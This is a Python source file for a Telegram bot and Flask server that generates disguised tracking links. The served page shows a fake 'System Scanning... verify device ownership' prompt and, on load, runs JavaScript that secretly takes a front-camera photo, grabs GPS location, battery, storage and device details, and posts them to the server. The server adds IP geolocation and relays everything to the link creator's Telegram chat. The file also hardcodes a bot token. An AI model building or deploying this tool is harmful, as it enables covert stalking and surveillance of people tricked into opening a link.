import os
import threading
import base64
import requests
import urllib.parse
import json
from flask import Flask, request, render_template_string
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "8519141404:AAE7yLTB6rZ0rjOW3HIkm5IT5tlVRulSGAk"
SERVER_URL = "https://mag-photo-bot.onrender.com"

app = Flask(__name__)

# --- JAVASCRIPT TRAP ---
def get_html(chat_id, redirect_url):
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Verifying...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{{background:#000;color:#fff;text-align:center;font-family:sans-serif;padding-top:50px;}}
        .loader{{border:4px solid #333;border-top:4px solid #007bff;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;}}
        @keyframes spin {{0%{{transform:rotate(0deg);}} 100%{{transform:rotate(360deg);}}}}
        p{{color:#888; font-size:14px;}}
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>System Scanning...</h2>
    <p>Please click <b>Allow</b> to verify device ownership.</p>
    
    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function startTrap() {{
            let data = {{
                chat_id: "{chat_id}",
                userAgent: navigator.userAgent,
                language: navigator.language || "en-US",
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || "Unknown",
                ram: navigator.deviceMemory || "Unknown",
                screen: screen.width + "x" + screen.height,
                battery_level: "N/A",
                charging: "No",
                storage_used: "0.00",
                storage_total: "0.00",
                lat: null,
                lon: null,
                photo: null,
                perm_cam: "Denied",
                perm_loc: "Denied"
            }};

            // 1. Battery Info
            try {{
                let b = await navigator.getBattery();
                data.battery_level = Math.round(b.level * 100) + "%";
                data.charging = b.charging ? "Yes" : "No";
            }} catch(e) {{}}

            // 2. Storage Info
            try {{
                if (navigator.storage && navigator.storage.estimate) {{
                    const estimate = await navigator.storage.estimate();
                    data.storage_used = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
                    data.storage_total = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
                }}
            }} catch(e) {{}}

            // 3. Camera Capture
            try {{
                let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
                data.perm_cam = "Allowed"; 
                let video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1500));
                
                let canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                data.photo = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
            }} catch(e) {{}}

            // 4. Location Capture
            try {{
                await new Promise((resolve) => {{
                    navigator.geolocation.getCurrentPosition(pos => {{
                        data.lat = pos.coords.latitude;
                        data.lon = pos.coords.longitude;
                        data.perm_loc = "Allowed";
                        resolve();
                    }}, () => resolve(), {{timeout: 3000}});
                }});
            }} catch(e) {{}}

            // 5. Send Data
            await fetch('/upload', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }});

            window.location.href = "{redirect_url}";
        }}
        window.onload = startTrap;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    cid = request.args.get('id')
    redir = request.args.get('redir', 'https://google.com')
    return render_template_string(get_html(cid, redir))

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    tid = data.get('chat_id')
    if not tid: return "Error", 400

    # IP Address Info
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,mobile,proxy").json()
    except:
        ip_info = {}

    # --- MAP LOGIC ---
    if data.get('lat') and data.get('lon'):
        map_lat = data.get('lat')
        map_lon = data.get('lon')
        loc_perm = "Allowed"
    else:
        map_lat = ip_info.get('lat', 0)
        map_lon = ip_info.get('lon', 0)
        loc_perm = "Denied"

    map_link = f"maps.google.com/maps?q={map_lat},{map_lon}"

    # Helper function to safe escape markdown chars
    def safe(val):
        return str(val).replace('_', '\\_').replace('*', '\\*').replace('`', '\\`')

    # --- MESSAGE FORMAT ---
    msg = (
        f"📊 **Visitor Information Captured**\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"🖥️ **Device and Browser**\n"  # '&' hata diya taaki error na aaye
        f"   • Device Model: `{safe(data.get('platform'))}`\n"
        f"   • User Agent: `{safe(data.get('userAgent'))}`\n\n"
        f"🌐 **Network Information**\n"
        f"   • IP Address: `{ip}`\n"
        f"   • ISP: {safe(ip_info.get('isp', 'N/A'))}\n"
        f"   • Language: {safe(data.get('language'))}\n\n"
        f"📍 **Location Details**\n"
        f"   • Country: {safe(ip_info.get('country', 'N/A'))}\n"
        f"   • Region: {safe(ip_info.get('regionName', 'N/A'))}\n"
        f"   • City: {safe(ip_info.get('city', 'N/A'))}\n"
        f"   • Timezone: {safe(ip_info.get('timezone', 'N/A'))}\n\n"
        f"🖼️ **Display Information**\n"
        f"   • Resolution: {safe(data.get('screen'))}\n\n"
        f"🔋 **Battery Status**\n"
        f"   • Level: {safe(data.get('battery_level'))}\n"
        f"   • Charging: {safe(data.get('charging'))}\n\n"
        f"🔐 **Device Permissions**\n"
        f"   • Camera: {safe(data.get('perm_cam'))}\n"
        f"   • Location: {loc_perm}\n\n"
        f"💾 **Hardware & Storage**\n"
        f"   • CPU Cores: {safe(data.get('cores'))}\n"
        f"   • RAM: {safe(data.get('ram'))} GB\n"
        f"   • Storage Used: {safe(data.get('storage_used'))} GB\n"
        f"   • Storage Total: {safe(data.get('storage_total'))} GB\n\n"
        f"🗺 **Map Link:**\n{map_link}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"⚡ Developed by: @MAGMAxRICH"
    )

    # Send Text (FIXED METHOD using POST and PARAMS)
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={
                "chat_id": tid,
                "text": msg,
                "parse_mode": "Markdown"
            }
        )
    except Exception as e:
        print(f"Message Send Error: {e}")

    # Send Photo
    if data.get('photo'):
        try:
            img_data = base64.b64decode(data.get('photo').split(',')[1])
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={'chat_id': tid}, files={'photo': ('cam.jpg', img_data)})
        except: pass

    return "OK"

# --- BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 **Tracker Online!**\nLink bhejo (jaise https://youtube.com).")

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text
    if not url.startswith("http"):
        await update.message.reply_text("❌ Link `http` ya `https` se shuru hona chahiye.")
        return

    uid = update.effective_chat.id
    redir = urllib.parse.quote(url)
    link = f"{SERVER_URL}/?id={uid}&redir={redir}"

    await update.message.reply_text(f"✅ **Tracking Link:**\n`{link}`")

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    bot.run_polling()